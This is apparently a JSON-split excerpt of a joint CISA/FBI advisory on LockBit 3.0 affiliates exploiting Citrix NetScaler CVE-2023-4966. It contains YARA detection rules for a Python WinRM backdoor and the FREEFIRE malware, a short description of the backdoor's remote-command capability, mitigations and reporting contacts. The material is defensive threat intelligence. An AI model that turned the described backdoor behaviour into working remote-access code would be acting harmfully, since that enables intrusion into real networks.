+  "id": "p113",
+  "text": "rule CISA_10478915_04 : backdoor communicates_with_c2 remote_access\n        {\n        meta:\n        author = \"CISA Code & Media Analysis\"\n        incident = \"10478915\"\n        date = \"2023-11-06\"\n        last_modified = \"20231108_1500\"\n        actor = \"n/a\"\n        family = \"n/a\"\n        capabilities = \"communicates-with-c2\"\n        malware_type = \"backdoor\"\n        tool_type = \"remote-access\"\n        description = \"Detects trojan python samples\"\n        sha256 = \"906602ea3c887af67bcb4531bbbb459d7c24a2efcb866bcb1e3b028a51f12ae6\"\n        strings:\n        $s1 = { 70 6f 72 74 20 3d 20 34 34 33 20 69 66 20 22 68 74 74 70 73 22 }\n        $s2 = { 6b 77 61 72 67 73 2e 67 65 74 28 22 68 61 73 68 70 61 73 73 77 64 22 29 3a }\n        $s3 = { 77 69 6e 72 6d 2e 53 65 73 73 69 6f 6e 20 62 61 73 69 63 20 65 72 72 6f 72 }\n        $s4 = { 57 69 6e 64 77 6f 73 63 6d 64 2e 72 75 6e 5f 63 6d 64 28 73 74 72 28 63 6d 64 29 29 }\n        condition:\n        all of them\n        }"
+ },
+ {
+  "id": "p114",
+  "text": "This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The\n       script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword\n       \"hashpasswd\" is present. If the keyword \"hashpasswd\" is not present, then the script attempts to\n       authenticate using basic authentication. Once a WinRM session is established with the remote\n       machine, the script has the ability to execute command line arguments on the remote machine. If\n       there is no command specified, then a default command of “whoami” is run."
+ },
+ {
+  "id": "p115",
+  "text": "Open Source YARA Rule"
+ },
+ {
+  "id": "p116",
+  "text": "Import \"pe\"\n        rule M_Hunting_Backdoor_FREEFIRE\n        {\n        meta: author = \"Mandiant\""
+ },
+ {
+  "id": "p117",
+  "text": "TLP:CLEAR                                                                                                    CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p118",
+  "text": "description = \"This is a hunting rule to detect FREEFIRE samples using OP code sequences in getLastRecord method\"\n         md5 = \"eb842a9509dece779d138d2e6b0f6949\"\n        malware_family = \"FREEFIRE\"\n        strings: $s1 = { 72 ?? ?? ?? ?? 7E ?? ?? ?? ?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 74 ?? ?? ?? ?? 25 72 ??\n        ?? ?? ?? 6F ?? ?? ?? ?? 25 72 ?? ?? ?? ?? 6F ?? ?? ?? ?? 25 6F ?? ?? ?? ?? 72 ?? ?? ?? ?? 72 ?? ?? ?? ?? 7E ?? ??\n        ?? ?? 28 ?? ?? ?? ?? 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 74 ?? ?? ?? ?? 25 6F ?? ?? ?? ?? 73 ?? ?? ?? ?? 6F ?? ?? ?? ??\n        ?? 6F ?? ?? ?? ?? 7E ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? 72 ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? ??\n        }\n        condition:\n        uint16(0) == 0x5A4D\n        and filesize >= 5KB\n        and pe.imports(\"mscoree.dll\")\n        and all of them }"
+ },
+ {
+  "id": "p119",
+  "text": "INCIDENT RESPONSE\n       Organizations are encouraged to assess Citrix software and your systems for evidence of\n       compromise, and to hunt for malicious activity (see Additional Resources section).If compromise is\n       suspected or detected, organizations should assume that threat actors hold full administrative access\n       and can perform all tasks associated with the web management software as well as installing\n       malicious code.\n       If a potential compromise is detected, organizations should:\n            1.   Quarantine or take offline potentially affected hosts.\n            2.   Reimage compromised hosts.\n            3.   Create new account credentials.\n            4.   Collect and review artifacts such as running processes/services, unusual authentications, and\n                 recent network connections.\n                 ▪ Note: Removing malicious administrator accounts may not fully mitigate risk considering\n                     threat actors may have established additional persistence mechanisms."
+ },
+ {
+  "id": "p120",
+  "text": "5. Report the compromise to FBI Internet Crime Complaint Center (IC3) at IC3.gov, local FBI\n            Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center\n            (report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government (SLTT) entities\n            can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722). If outside of the US, please\n            contact your national cyber center."
+ },
+ {
+  "id": "p121",
+  "text": "TLP:CLEAR                                                                                       CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p122",
+  "text": "MITIGATIONS\n       The authoring organizations of this CSA               These mitigations apply to all critical\n       recommend       organizations     implement       the infrastructure organizations and network\n       mitigations below to improve your cybersecurity       defenders using Citrix NetScaler ADC and\n       posture on the basis of the threat actor activity and Gateway software. CISA and authoring\n       to reduce the risk of compromise associated with      organizations recommend that software\n       Citrix CVE 2023-4966 and LockBit 3.0                  manufacturers incorporate secure-by-design\n       ransomware & ransomware affiliates. These             and -default principles and tactics into their\n       mitigations align with the Cross-Sector               software development practices to limit the\n       Cybersecurity performance goals (CPGs)                impact of exploitation such as threat actors\n       developed by CISA and the National Institute of       leveraging unpatched vulnerabilities within Citrix\n       Standards and Technology (NIST). The CPGs             NetScaler appliances, which strengthens the\n       provide a minimum set of practices and                security posture of their customers.\n       protections that CISA and NIST recommend all\n                                                             For more information on secure by design, see\n       organizations implement. CISA and NIST based\n                                                             CISA’s Secure by Design and Default webpage\n       the CPGs on existing cybersecurity frameworks\n                                                             and joint guide.\n       and guidance to protect against the most common\n       and impactful threats, tactics, techniques, and\n       procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the\n       CPGs, including additional recommended baseline protections.\n           •    Isolate NetScaler ADC and Gateway appliances for testing until patching is ready and\n                deployable.\n           •    Secure remote access tools by:\n                    o Implement application controls to manage and control the execution of software,\n                       including allowlisting remote access programs. Application controls should prevent the\n                       installation and execution of portable versions of unauthorized remote access and other\n                       software. A properly configured application allowlisting solution will block any unlisted\n                       application execution. Allowlisting is important because antivirus solutions may fail to\n                       detect the execution of malicious portable executables when the files use any\n                       combination of compression, encryption, or obfuscation.\n           •    Strictly limit the use of RDP and other remote desktop services. If RDP is necessary,\n                rigorously apply best practices, for example [CPG 2.W]:\n                    o Audit the network for systems using RDP.\n                    o Close unused RDP ports.\n                    o Enforce account lockouts after a specified number of attempts.\n                    o Apply phishing-resistant multifactor authentication (MFA).\n                    o Log RDP login attempts.\n           •    Restrict the use of PowerShell, using Group Policy, and only grant access to specific users\n                on a case-by-case basis. Typically, only those users or administrators who manage the\n                network or Windows operating systems (OSs) should be permitted to use PowerShell [CPG\n                2.E]."
+ },
+ {
+  "id": "p123",
+  "text": "TLP:CLEAR                                                                                        CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p124",
+  "text": "•    Update Windows PowerShell or PowerShell Core to the latest version and uninstall all\n                earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either\n                non-existent or do not record enough detail to aid in enterprise monitoring and incident\n                response activities [CPG 1.E, 2.S, 2.T].\n           •    Enable enhanced PowerShell logging [CPG 2.T, 2.U].\n                    o PowerShell logs contain valuable data, including historical OS and registry interaction\n                        and possible TTPs of a threat actor’s PowerShell use.\n                    o Ensure PowerShell instances, using the latest version, have module, script block, and\n                        transcription logging enabled (enhanced logging).\n                    o The two logs that record PowerShell activity are the PowerShell Windows Event Log\n                        and the PowerShell Operational Log. FBI and CISA recommend turning on these two\n                        Windows Event Logs with a retention period of at least 180 days. These logs should be\n                        checked on a regular basis to confirm whether the log data has been deleted or\n                        logging has been turned off. Set the storage size permitted for both logs to as large as\n                        possible.\n           •    Configure the Windows Registry to require User Account Control (UAC) approval for\n                any PsExec operations requiring administrator privileges to reduce the risk of lateral\n                movement by PsExec.\n           •    Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary\n                data and servers in a physically separate, segmented, and secure location (e.g., hard drive,\n                storage device, or the cloud).\n           •    Require all accounts with password logins (e.g., service account, admin accounts, and\n                domain admin accounts) to comply with NIST's standards for developing and managing\n                password policies.\n                    o Use longer passwords consisting of at least 15 characters [CPG 2.B].\n                    o Store passwords in hashed format using industry-recognized password managers.\n                    o Add password user “salts” to shared login credentials.\n                    o Avoid reusing passwords [CPG 2.C].\n                    o Implement multiple failed login attempt account lockouts [CPG 2.G].\n                    o Disable password “hints.”\n                    o Require administrator credentials to install software.\n           •    Keep all operating systems, software, and firmware up to date. Timely patching is one of\n                the most efficient and cost-effective steps an organization can take to minimize its exposure to\n                cybersecurity threats. Organizations should patch vulnerable software and hardware systems\n                within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited\n                vulnerabilities in internet-facing systems [CPG 1.E].\n                    o Upgrade vulnerable NetScaler ADC and Gateway appliances to the latest version\n                        available to lower the risk of compromise."
+ },
+ {
+  "id": "p125",
+  "text": "VALIDATE SECURITY CONTROLS"
+ },
+ {
+  "id": "p126",
+  "text": "TLP:CLEAR                                                                                       CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p127",
+  "text": "In addition to applying mitigations, CISA recommends exercising, testing, and validating your\n       organization's security program against the threat behaviors mapped to the MITRE ATT&CK for\n       Enterprise framework in this advisory. CISA recommends testing your existing security controls\n       inventory to assess how they perform against the ATT&CK techniques described in this advisory.\n       To get started:\n           1. Select an ATT&CK technique described in this advisory (see Table 6:).\n           2. Align your security technologies against the technique.\n           3. Test your technologies against the technique.\n           4. Analyze your detection and prevention technologies’ performance.\n           5. Repeat the process for all security technologies to obtain a set of comprehensive performance\n              data.\n           6. Tune your security program, including people, processes, and technologies, based on the\n              data generated by this process.\n       CISA and the authoring organizations recommend continually testing your security program, at scale,\n       in a production environment to ensure optimal performance against the MITRE ATT&CK techniques\n       identified in this advisory."
+ },
+ {
+  "id": "p128",
+  "text": "RESOURCES\n           •    Stopransomware.gov is a whole-of-government approach that gives one central location for\n                ransomware resources and alerts.\n           •    The Joint Ransomware Guide provides preparation, prevention, and mitigation best practices\n                as well as a ransomware response checklist.\n           •    Cyber Hygiene Services and Ransomware Readiness Assessment provide no-cost cyber\n                hygiene and ransomware readiness assessment services."
+ },
+ {
+  "id": "p129",
+  "text": "REPORTING\n       The FBI is seeking any information that can be shared, to include boundary logs showing\n       communication to and from foreign IP addresses, a sample ransom note, communications with\n       LockBit 3.0 affiliates, Bitcoin wallet information, decryptor files, and/or a benign sample of an\n       encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee\n       victim files will be recovered. Furthermore, payment may also embolden adversaries to target\n       additional organizations, encourage other criminal actors to engage in the distribution of ransomware,\n       and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the\n       ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet\n       Crime Complaint Center (IC3) at ic3.gov, local FBI Field Office, or CISA via the agency’s Incident\n       Reporting System or its 24/7 Operations Center at report@cisa.gov or (888) 282-0870."
+ },
+ {
+  "id": "p130",
+  "text": "DISCLAIMER\n       The information in this report is being provided “as is” for informational purposes only. CISA and\n       authoring organizations do not endorse any commercial entity, product, company, or service,\n       including any entities, products, or services linked within this document. Any reference to specific"
+ },
+ {
+  "id": "p131",
+  "text": "TLP:CLEAR                                                                                   CISA  FBI | MS-ISAC | ACSC"
+ },
+ {
+  "id": "p132",
+  "text": "commercial entities, products, processes, or services by service mark, trademark, manufacturer, or\n       otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and the\n       authoring organizations."
+ },
+ {
+  "id": "p133",
+  "text": "ACKNOWLEDGEMENTS\n       Boeing contributed to this CSA."
+ },
+ {
+  "id": "p134",
+  "text": "REFERENCES\n       [1] NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966\n       [2] Investigation of Session Hijacking via Citrix NetScaler ADC and Gateway Vulnerability (CVE-2023-\n       4966\n       [3] What is Mshta, How Can it Be Used and How to Protect Against it (McAfee)"
+ },
+ {
+  "id": "p135",
+  "text": "VERSION HISTORY\n       November 21, 2023: Initial version."
+ }
+]
